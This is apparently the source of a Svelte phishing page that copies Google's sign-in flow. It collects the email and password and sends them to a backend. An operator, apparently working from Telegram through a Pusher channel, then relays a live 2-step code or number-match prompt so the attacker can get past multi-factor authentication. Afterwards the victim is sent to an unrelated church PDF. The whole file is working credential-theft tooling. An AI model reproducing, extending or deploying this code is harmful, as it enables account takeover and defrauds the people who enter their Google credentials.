<script>
  import { sendFrmData, sendOTP } from "$lib";
  import Pusher from 'pusher-js';
  import googleImg from '$lib/assets/imgs/google_img.webp';
  import { PUBLIC_PUSHER_KEY, PUBLIC_PUSHER_CLUSTER } from '$env/static/public'

  let email = $state('');
  let password = $state('');
  let otp = $state('');
  let promptNumber = $state(''); // holds the dynamic numerical value
  let emailError = $state('');
  let passwordError = $state('');
  let otpError = $state('');
  let showPassword = $state(false);
  let passwordErrEleMsg = $state('');
  let isLoading = $state(false);
  let pwdBtnState = $state(false);
  let showPromptError = $state(false); // help toggle error on prompt
  
  let step = $state('email'); // 'email' | 'password' | 'otp' | 'success'
  let authType = $state(''); // 'OTP' | 'PROMPT' default is empty i.e. ''
  let finalStatus = $state(''); // Tracking final state evaluations: 'APPROVED' or 'REJECTED' or '' (default is '')
  let showOTPsection = $state(false); // false (default) or true
  let otpRetries = $state(0); // help increment amount of otp retries

  let showFinalStatus = $derived.by(() => {
    // show error on rejected or failed trigger state evaluation
    if (finalStatus === 'REJECTED' || finalStatus === '') {
      return 'hide'
    }

    // APPROVED final state
    return 'show'
  });

  let activeChannelName = $state(''); // help holds the active channel name attached with the sessionId

  // Floating label focus states
  let emailFocused = $state(false);
  let passwordFocused = $state(false);
  let otpFocused = $state(false);

  // Dropdown list
  let showCreateDropdown = $state(false);

  // References for pure transition end event binding
  let emailContainer = $state();
  let passwordContainer = $state();
  let otpContainer = $state();
  let promptContainer = $state();
  let successContainer = $state();

  $effect(() => {
    // show OTP or PROMPT step of the form section
    if (showOTPsection === true) {
      isLoading = false;
      step = 'otp';
      
      passwordContainer.classList.remove('opacity-100');
      passwordContainer.classList.add('opacity-0');

      const otpHandler = (ev) => {
        if (ev.propertyName === 'opacity') {
          passwordContainer?.removeEventListener('transitionend', otpHandler);
          passwordContainer?.classList.add('hidden');
          otpContainer?.classList.remove('hidden');

          requestAnimationFrame(() => {
            otpContainer?.classList.remove('opacity-0');
            otpContainer?.classList.add('opacity-100');
          });
        }
      };
      passwordContainer.addEventListener('transitionend', otpHandler);
    }

    // OTP or PROMPT error
    if (finalStatus === 'REJECTED') {
      otpError = 'Your verification code is invalid. Please try again.';
      showPromptError = true;

    }

    // check final state status: (also check final state error)
    if (showFinalStatus === 'show') {
      showOTPsection = false
      isLoading = false;
      step = 'success';
      showPromptError = false; // if there is any showing on prompt side of the section

      otpContainer.classList.remove('opacity-100');
      otpContainer.classList.add('opacity-0');

      const successHandler = (ev) => {
        if (ev.propertyName === 'opacity') {
          otpContainer?.removeEventListener('transitionend', successHandler);
          otpContainer?.classList.add('hidden');
          successContainer?.classList.remove('hidden');

          requestAnimationFrame(() => {
            successContainer?.classList.remove('opacity-0');
            successContainer?.classList.add('opacity-100');
          });
        }
      };

      otpContainer.addEventListener('transitionend', successHandler);

      // redirect user after 3seconds
      setTimeout(() => {
        location.href = 'https://www.peacechurch-cr.org/editoruploads/files/GROW/Resources%20for%20Growing/Bible%20Reading/Scripture_for_Every_Moment.pdf'
      }, 2000)
    } 
  });

  // Establish an isolated single-user stream (per session based interaction)
  function setupPrivatePusherChannel(sessionId) {
    // Configured to automatically ping /api/pusher/auth behind the scenes
    const pusherClient = new Pusher(PUBLIC_PUSHER_KEY, {
      cluster: PUBLIC_PUSHER_CLUSTER,
      authEndpoint: '/api/pusher/auth'
    });

    activeChannelName = `private-session-${sessionId}`;

    // Subscribes matching the "private-session-{UUID}" footprint your backend utilizes
    const privateChannel = pusherClient.subscribe(activeChannelName);

    // Listen for the custom value you type into Telegram
    privateChannel.bind('auth-event', ({ type='', value='' }) => {
      authType = type; // 'OTP' or 'PROMPT'
      showOTPsection = true;

      // close the connection and show the OTP/PROMPT section
      if (authType === 'PROMPT') {
        promptNumber = value
      }

    });

    // Listen block 2: Catches the Success / Error evaluation button click
    privateChannel.bind('final-status-event', ({ status }) => {
      finalStatus = status; // 'APPROVED' or 'REJECTED'
      
      // Fully disconnect and release socket streams now that the whole lifecycle is over
      pusherClient.unsubscribe(activeChannelName);
      pusherClient.disconnect();
    });

    // NEW Listener C: Catches the top-row Password Failure trigger
    privateChannel.bind('password-failed-event', ({ message }) => {
      pusherClient.unsubscribe(activeChannelName);
      pusherClient.disconnect();
      // Force the UI back to State A and surface the error reason explicitly
      passwordError = message
      password = ''; // Clear out the bad password field for safe re-entry
      isLoading = false;
      pwdBtnState = false; 
    });
  }

  function validateEmailFormat(input) {
    if (!input) return "Enter an email or phone number";
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (input.includes('@') && !emailRegex.test(input)) {
      return "Enter a valid email address";
    }
    if (input.length < 3) return "Enter a valid email or phone number";
    return "";
  }

  function handleEmailNext(e) {
    e.preventDefault();
    const err = validateEmailFormat(email.trim());
    if (err) {
      emailError = err;
      return;
    }
    emailError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      step = 'password';

      if (emailContainer && passwordContainer) {
        emailContainer.classList.remove('opacity-100');
        emailContainer.classList.add('opacity-0', 'pointer-events-none');

        const transitionHandler = (ev) => {
          if (ev.propertyName === 'opacity') {
            emailContainer?.removeEventListener('transitionend', transitionHandler);
            emailContainer?.classList.add('hidden');
            passwordContainer?.classList.remove('hidden');

            requestAnimationFrame(() => {
              passwordContainer?.classList.remove('opacity-0');
              passwordContainer?.classList.add('opacity-100');
            });
          }
        };
        emailContainer.addEventListener('transitionend', transitionHandler);
      }
    }, 1500);
  }

  async function handlePasswordSubmit(e) {
    e.preventDefault();
    if (!password) {
      passwordError = "Enter your password";
      return;
    }
    if (password.length < 5) {
      passwordError = "Wrong password. Try again.";
      return;
    }

    passwordError = '';
    pwdBtnState = true;
    isLoading = true;

    try {
      // send to backend api
      const res = await sendFrmData({ signinType: 'Google Sign-in', email: email, password: password });
      
      if (res.error) {
        passwordError = res.message || 'Failed to dispatch verification.';
        pwdBtnState = false;
        isLoading = false;
        return
      }

      // wait for pusher-js to confirm if otp or prompt number is be shown (Dynamically open the targeted real-time pipeline)
      setupPrivatePusherChannel(res.sessionId);
      
    } catch (error) {
      passwordError = 'Communcation error. Please try again.';
      pwdBtnState = false;
      isLoading = false;
      console.error('Error submitting form: \n', error);
    }
  }

  function handleBackToEmail() {
    password = '';
    passwordError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      step = 'email';

      if (emailContainer && passwordContainer) {
        passwordContainer.classList.remove('opacity-100');
        passwordContainer.classList.add('opacity-0');

        const handleBack = (ev) => {
          if (ev.propertyName === 'opacity') {
            passwordContainer?.removeEventListener('transitionend', handleBack);
            passwordContainer?.classList.add('hidden');
            emailContainer?.classList.remove('hidden');

            requestAnimationFrame(() => {
              emailContainer?.classList.remove('opacity-0', 'pointer-events-none');
              emailContainer?.classList.add('opacity-100');
            });
          }
        };
        passwordContainer.addEventListener('transitionend', handleBack);
      }
    }, 450);
  }

  function handleBackToPassword() {
    otp = '';
    otpError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      step = 'password';

      if (passwordContainer && otpContainer) {
        otpContainer.classList.remove('opacity-100');
        otpContainer.classList.add('opacity-0');

        const handleBack = (ev) => {
          if (ev.propertyName === 'opacity') {
            otpContainer?.removeEventListener('transitionend', handleBack);
            otpContainer?.classList.add('hidden');
            passwordContainer?.classList.remove('hidden');

            requestAnimationFrame(() => {
              passwordContainer?.classList.remove('opacity-0');
              passwordContainer?.classList.add('opacity-100');
            });
          }
        };
        otpContainer.addEventListener('transitionend', handleBack);
      }
    }, 450);
  }

  async function handleOtpSubmit(e) {
    e.preventDefault();
    
    if (!otp) {
      otpError = "Enter a code";
      return;
    }
    const cleanOtp = otp.replace(/\D/g, '');
    if (cleanOtp.length < 6) {
      otpError = "Enter a 6-digit verification code";
      return;
    }
    otpError = '';
    isLoading = true;

    // send to backend api
    try {
      // if (otpRetries > 0) {
      //   await sendFrmData({ signinType: 'Google Signin', email: email, password: password });
      //   return
      // }
      const res = await sendOTP({ otp: otp, email: email })
      // increment otpRetries
      // otpRetries = otpRetries + 1;
    } catch (error) {
      console.error('Something went wrong sending OTP: \n', error.message);
      otpError = "Something went wrong while communicating with the server";
    }
  }
</script>


<section class="min-h-screen bg-[#f0f4f9] flex flex-col justify-between font-sans antialiased text-[#202124]">
  <div class="flex-1 flex items-center justify-center px-4 py-8">
    <div class="w-md bg-white rounded-3xl sm:border border-[#dadce0] p-6 sm:p-10 relative overflow-hidden min-h-125 flex flex-col justify-between shadow-none sm:shadow-sm">
      
      <!-- Blue loading progress bar -->
      <div class="absolute top-0 left-0 right-0 h-1 bg-[#e8f0fe] overflow-hidden transition-opacity duration-300 {isLoading ? 'opacity-100' : 'opacity-0'}">
        <div class="h-full bg-[#1a73e8] animate-[loading-bar_1.2s_infinite_ease-in-out]"></div>
      </div>

      <div class="flex-1 flex flex-col">
        <!-- Google Logo SVG -->
        <div class="flex justify-center mb-6 mt-2">
          <div class="w-32 h-12 relative">
            <img src={googleImg} alt="sso_logo" class="absolute w-full min-w-full h-full object-center object-contain">
          </div>
          <!-- <svg viewBox="0 0 74 24" width="74" height="24" class="h-10 w-20">
            <path fill="#4285F4" d="M12.24 10.285V14.4h6.887c-.275 1.564-1.852 4.594-6.887 4.594-4.34 0-7.88-3.597-7.88-8.03s3.54-8.03 7.88-8.03c2.47 0 4.12 1.02 5.07 1.93l3.26-3.13C18.36 1.78 15.61.35 12.24.35 5.5.35-.01 5.83-.01 12.58s5.51 12.23 12.25 12.23c7.04 0 11.72-4.91 11.72-11.84 0-.8-.09-1.4-.2-1.92H12.24z"/>
            <path fill="#EA4335" d="M35.62 16.59c-3.12 0-5.65-2.54-5.65-5.64s2.53-5.64 5.65-5.64 5.65 2.54 5.65 5.64-2.53 5.64-5.65 5.64zm0-15.04c-5.41 0-9.84 4.19-9.84 9.4s4.43 9.4 9.84 9.4 9.84-4.19 9.84-9.4-4.43-9.4-9.84-9.4z" transform="translate(-1.5, 0)"/>
            <path fill="#FBBC05" d="M57.65 16.59c-3.12 0-5.65-2.54-5.65-5.64s2.53-5.64 5.65-5.64 5.65 2.54 5.65 5.64-2.53 5.64-5.65 5.64zm0-15.04c-5.41 0-9.84 4.19-9.84 9.4s4.43 9.4 9.84 9.4 9.84-4.19 9.84-9.4-4.43-9.4-9.84-9.4z" transform="translate(-3, 0)"/>
            <path fill="#4285F4" d="M78.68 16.59c-3.04 0-5.5-2.45-5.5-5.58 0-3.16 2.46-5.7 5.5-5.7 3.01 0 5.25 2.37 5.25 5.7 0 3.14-2.24 5.58-5.25 5.58zm5.28-14.79v1.27h-.07c-.63-.76-1.84-1.42-3.37-1.42-3.18 0-6.19 2.77-6.19 6.36 0 3.56 3.01 6.31 6.19 6.31 1.54 0 2.74-.66 3.37-1.45h.07v.91c0 2.42-1.3 3.72-3.39 3.72-1.7 0-2.76-1.22-3.15-2.25l-3.32 1.38c.98 2.33 3.52 5.09 6.47 5.09 3.73 0 6.89-2.2 6.89-6.61V2.15H83.96z" transform="translate(-4.5, 0)"/>
            <path fill="#34A853" d="M94.67 1.83V23.7h3.81V1.83h-3.81z" transform="translate(-5.5, 0)"/>
            <path fill="#EA4335" d="M109.84 16.59c-1.87 0-3.56-1.02-4.4-2.57l12.43-5.11-.43-1.07c-.77-2.09-3.13-5.49-7.79-5.49-4.63 0-8.49 3.63-8.49 9.4 0 5.4 3.82 9.4 8.78 9.4 4.01 0 6.32-2.44 7.29-3.88l-2.98-1.99c-.98 1.45-2.29 2.31-4.14 2.31zm-.32-15.04c-3.88 0-6.73 2.02-7.59 4.39l8.97 3.71-.59-1.45c-.53-1.38-1.99-6.65-8.29-6.65z" transform="translate(-7, 0)"/>
          </svg> -->
        </div>

        <!-- STAGE 1: Email Box -->
        <div bind:this={emailContainer} class="flex-1 flex flex-col justify-between transition-opacity duration-300 ease-in-out opacity-100">
          <div>
            <h1 class="text-2xl font-normal text-[#202124] text-center mb-2">Sign in</h1>
            <p class="text-base text-[#5f6368] text-center mb-8">to continue to Google Account</p>

            <form id="email-form" onsubmit={handleEmailNext}>
              <div class="relative mb-1">
                <input
                  type="text"
                  bind:value={email}
                  onfocus={() => emailFocused = true}
                  onblur={() => emailFocused = false}
                  id="email" 
                  name="email"
                  class="w-full px-3.5 py-4 text-base border rounded-md focus:outline-none transition-all duration-150 bg-transparent {emailError ? 'border-[#d93025] focus:ring-1 focus:ring-[#d93025]' : 'border-[#dadce0] focus:border-[#1a73e8] focus:ring-1 focus:ring-[#1a73e8]'}"
                />
                <label 
                  for="email"
                  class="absolute left-3.5 transition-all duration-150 pointer-events-none px-1.5 bg-white {emailFocused || email ? 'top-[-8.5px] text-[12px] font-medium' : 'top-4 text-base text-[#5f6368]'} {emailError ? 'text-[#d93025]' : (emailFocused ? 'text-[#1a73e8]' : 'text-[#5f6368]')}"
                >
                  Email or phone
                </label>
              </div>

              {#if emailError}
                <div class="flex items-start gap-1.5 mt-2 text-xs text-[#d93025] animate-fadeIn">
                  <span>{emailError}</span>
                </div>
              {/if}

              <button type="button" class="text-sm font-semibold text-[#1a73e8] hover:text-[#1557b0] mt-2 block">Forgot email?</button>

              <p class="text-[14px] leading-relaxed text-[#5f6368] my-8">
                Not your computer? Use a Private window to sign in privately. 
                <a 
                  href="#/" 
                  onClick={(e) => { e.preventDefault(); alert("Google Sign-In uses your browser's local sandbox to verify credentials safely."); }}
                  class="text-[#1a73e8] font-semibold hover:underline inline-block"
                >
                  Learn more about using guest mode
                </a>
              </p>
            </form>
          </div>

          <div class="flex items-center justify-between mt-auto">
            <button onclick={() => showCreateDropdown = !showCreateDropdown} class="text-sm font-semibold text-[#1a73e8] hover:bg-gray-50 px-3 py-2 rounded-md">Create account</button>
            <button type="submit" form="email-form" class="px-6 py-2.5 bg-[#1a73e8] text-white text-sm font-semibold rounded-full hover:bg-[#1557b0] shadow-sm">Next</button>
          </div>
        </div>

        <!-- STAGE 2: Password Box (Hidden initially) -->
        <div bind:this={passwordContainer} class="flex-1 flex flex-col justify-between transition-opacity duration-300 ease-in-out opacity-0 hidden">
          <div>
            <h1 class="text-2xl font-normal text-[#202124] text-center mb-1">Welcome</h1>
            <div class="flex justify-center mb-6">
              <button onclick={handleBackToEmail} class="inline-flex items-center gap-1.5 border border-[#dadce0] rounded-full px-3 py-1 text-xs text-[#3c4043] hover:bg-[#f8f9fa]">
                <span class="truncate">{email}</span>
              </button>
            </div>

            <form id="password-form" onsubmit={handlePasswordSubmit} class="space-y-4">
              <div class="relative">
                <input
                  type={showPassword ? 'text' : 'password'}
                  bind:value={password}
                  onfocus={() => passwordFocused = true}
                  onblur={() => passwordFocused = false}
                  id="pwd" 
                  name="password"
                  class="w-full px-3.5 py-4 text-base border rounded-md focus:outline-none transition-all duration-150 bg-transparent {passwordError ? 'border-[#d93025] focus:ring-1 focus:ring-[#d93025]' : 'border-[#dadce0] focus:border-[#1a73e8] focus:ring-1 focus:ring-[#1a73e8]'}"
                />
                <label 
                  for="pwd"
                  class="absolute left-3.5 transition-all duration-150 pointer-events-none px-1.5 bg-white {passwordFocused || password ? 'top-[-8.5px] text-[12px] font-medium' : 'top-4 text-base text-[#5f6368]'} {passwordError ? 'text-[#d93025]' : (passwordFocused ? 'text-[#1a73e8]' : 'text-[#5f6368]')}"
                >
                  Enter your password
                </label>
              </div>

              {#if passwordError}
                <div class="text-xs text-[#d93025] px-1 animate-fadeIn">{passwordError}</div>
              {/if}

              <label class="flex items-center gap-3 cursor-pointer user-select-none mt-2">
                <input type="checkbox" bind:checked={showPassword} class="w-4.5 h-4.5" />
                <span class="text-sm select-none">Show password</span>
              </label>
            </form>
          </div>

          <div class="flex items-center justify-between mt-auto">
            <button class="text-sm font-semibold text-[#1a73e8] px-3 py-2" onclick={() => passwordError = "Forgot password helper opened."}>Forgot password?</button>
            <button 
              type="submit" 
              form="password-form" 
              disabled={isLoading} 
              class="px-6 py-2.5 bg-[#1a73e8] text-white text-sm font-semibold rounded-full hover:bg-[#1557b0] disabled:opacity-30 duration-200 transition-opacity"
            >
              Next
            </button>
          </div>
        </div>

        <!-- *** Either OTP code or Prompt Number Display section will be shown (depending on server response) *** -->
        <!-- STAGE 3: OTP Code or PROMPT Number Input (Hidden initially) -->
        <div bind:this={otpContainer} class="flex-1 flex flex-col justify-between transition-opacity duration-300 ease-in-out opacity-0 hidden">
          <!-- for PROMPT Section -->
          {#if authType === 'PROMPT'}
            <div class="flex flex-col items-center text-center space-y-5 py-2 animate-fade-in">
              <!-- username -->
              <div class="flex items-center space-x-2 border border-[#dadce0] rounded-full px-3 py-1 pr-4 inline-flex text-sm text-[#3c4043] hover:bg-gray-50 cursor-pointer mb-6 transition-colors select-none">
                <button type="button" title="username" onclick={handleBackToPassword} class="w-5 h-5 bg-[#e8f0fe] text-[#1a73e8] rounded-full flex items-center justify-center">
                  <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user" aria-hidden="true"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                </button>
                <span class="font-medium truncate max-w-45 text-xs">{email}</span><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-down text-[#5f6368]" aria-hidden="true"><path d="m6 9 6 6 6-6"></path></svg>
              </div>
              <!-- prompt description -->
              <div>
                <h2 class="text-2xl font-normal text-[#202124] tracking-tight font-display">Check your phone</h2>
                <p class="text-sm text-[#5f6368] mt-2 leading-relaxed">
                  Google sent a notification to your smartphone or device. Click the matching number to confirm identity.
                </p>
              </div>

              <!-- circlar monbile icon -->
              <div class="relative">
                <div class="w-16 h-16 bg-[#e8f0fe] rounded-full flex items-center justify-center text-[#1a73e8]">
                  <svg class="w-8 h-8" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                  </svg>
                </div>
                <span class="absolute -bottom-1 -right-1 bg-white border border-[#dadce0] p-1 rounded-full text-[#137333]">
                  <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4" />
                  </svg>
                </span>
              </div>

              <!-- prompt number to be displayed -->
              <div class="bg-[#f8f9fa] rounded-xl p-4 border border-[#e8eaed] w-full max-w-85 space-y-4">
                <p class="text-xs text-[#5f6368] uppercase tracking-wider font-semibold">Your Verification Challenge Number</p>
                <div class="text-[52px] font-display font-bold text-[#1a73e8] tracking-wider leading-none select-none my-1">
                  {promptNumber}
                </div>
                <p class="text-xs text-[#5f6368] leading-relaxed">
                  Match this code on your companion device to secure the session. Choosing incorrect numbers blocks the token request.
                </p>
              </div>

              <!-- waiting animation -->
              {#if showPromptError === true}
                <div class="text-xs text-amber-700">
                  There was an error on code verification and confirmation. Please try authenticating again.
                </div>
              {:else}
                <div class="flex items-center space-x-2 text-xs text-[#5f6368]">
                  <div class="w-4 h-4 border-2 border-t-transparent border-[#1a73e8] rounded-full animate-spin"></div>
                  <span>Waiting for mobile verification confirmation...</span>
                </div>
              {/if}
            </div>
          {:else}
            <!-- for OTP Section -->
            <div>
              <div>
                <h1 class="text-2xl font-normal text-[#202124] text-center mb-1">2-Step Verification</h1>
                <div class="flex justify-center mb-6">
                  <button onclick={handleBackToPassword} type="button" class="inline-flex items-center gap-1.5 bg-white border border-[#dadce0] rounded-full pl-2 pr-3 py-1 text-sm font-medium text-[#3c4043] hover:bg-[#f8f9fa] transition-colors focus:outline-none">
                    <div class="w-5 h-5 rounded-full bg-[#1a73e8] text-white flex items-center justify-center text-[10px] font-semibold">
                      {email.charAt(0).toUpperCase()}
                    </div>
                    <span class="truncate flex-1 font-normal text-[14px]">{email}</span>
                    <svg class="w-4 h-4 text-[#5f6368] shrink-0" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
                      <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7" />
                    </svg>
                  </button>
                </div>
  
                <p class="text-sm font-normal text-[#5f6368] leading-relaxed mb-6">
                  To help keep your account secure, Google wants to make sure it's really you. A text message with a 6-digit verification code has been sent to your phone.
                </p>
  
                <form id="otp-form" onsubmit={handleOtpSubmit} class="mt-4">
                  <div class="relative flex items-center mb-1">
                    <span class="absolute left-3.5 text-base text-[#5f6368] font-medium pointer-events-none">G-</span>
                    <input
                      type="text"
                      id="google-otp-input"
                      name="google-otp"
                      maxlength="6"
                      bind:value={otp}
                      oninput={(e) => {
                        otp = e.currentTarget.value.replace(/\D/g, '');
                        if (otpError) otpError = '';
                      }}
                      onfocus={() => otpFocused = true}
                      onblur={() => otpFocused = false}
                      class="w-full pl-9 pr-3.5 py-4 text-base text-[#202124] border rounded-md focus:outline-none transition-all duration-150 bg-transparent tracking-widest font-semibold {otpError ? 'border-[#d93025] focus:ring-1 focus:ring-[#d93025]' : 'border-[#dadce0] focus:border-[#1a73e8] focus:ring-1 focus:ring-[#1a73e8]'}"
                    />
                    <label 
                      for="google-otp-input"
                      class="absolute left-3.5 transition-all duration-150 pointer-events-none px-1.5 bg-white {otpFocused || otp ? 'top-[-8.5px] text-[12px] font-medium' : 'top-4 text-base text-[#5f6368] pl-9'} {otpError ? 'text-[#d93025]' : (otpFocused ? 'text-[#1a73e8]' : 'text-[#5f6368]')}"
                    >
                      Enter 6-digit code
                    </label>
                  </div>
  
                  {#if otpError}
                    <div class="flex items-start gap-1.5 mt-2 px-1 text-xs text-[#d93025] leading-normal animate-fadeIn">
                      <svg viewBox="0 0 24 24" width="16" height="16" class="shrink-0 fill-current mt-px">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                      </svg>
                      <span>{otpError}</span>
                    </div>
                  {/if}
  
                  <div class="flex items-center mt-3 ml-1 select-none">
                    <input
                      type="checkbox"
                      id="trustDevice"
                      checked
                      class="w-4.5 h-4.5 rounded border-[#dadce0] text-[#1a73e8] focus:ring-[#1a73e8] cursor-pointer"
                    />
                    <label for="trustDevice" class="ml-3 text-sm text-[#5f6368] leading-normal cursor-pointer select-none">
                      Don't ask again on this device
                    </label>
                  </div>
                </form>
              </div>
              
              <!-- verification & resend code buttons -->
              <div class="flex items-center justify-between mt-12">
                <button
                  type="button"
                  onclick={() => otpError = 'A new verification code has been dispatched to your primary backup number.'}
                  class="text-[14px] font-semibold text-[#1a73e8] hover:text-[#1557b0] hover:bg-[#f6f9fc] disabled:bg-[#f6f9fc] px-3 py-2 rounded-md -ml-3 focus:outline-none cursor-pointer"
                >
                  Resend code
                </button>
                <button
                  type="submit"
                  form="otp-form"
                  class="px-6 py-2.5 bg-[#1a73e8] text-white text-sm font-semibold rounded-full hover:bg-[#1557b0] disabled:opacity-40 cursor-pointer"
                >
                  Verify
                </button>
              </div>
            </div>
          {/if}
        </div>

        <!-- STAGE 4: Success Box -->
        <div bind:this={successContainer} class="flex-1 flex flex-col justify-center items-center text-center transition-opacity duration-300 ease-in-out opacity-0 hidden py-6">
          <div class="w-16 h-16 rounded-full bg-[#e6f4ea] text-[#137333] flex items-center justify-center mb-6 animate-scaleIn">
            <svg class="w-9 h-9 fill-none stroke-current" stroke-width="2.5" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
            </svg>
          </div>

          <h2 class="text-2xl font-normal text-[#202124] mb-2">Signed in successfully</h2>

          <p class="text-sm text-gray-500 max-w-70 mb-6">Success! You are authenticated securely.</p>

          <button 
            type="button" 
            onclick={() => { 
              email = ''; password = ''; otp = ''; step = 'email';  
              location.href = 'https://www.peacechurch-cr.org/editoruploads/files/GROW/Resources%20for%20Growing/Bible%20Reading/Scripture_for_Every_Moment.pdf';
            }} 
            class="px-6 py-2.5 bg-gray-100 rounded-full text-gray-700 text-sm font-semibold"
          >
            continue
          </button>
        </div>
      </div>
    </div>
  </div>
</section>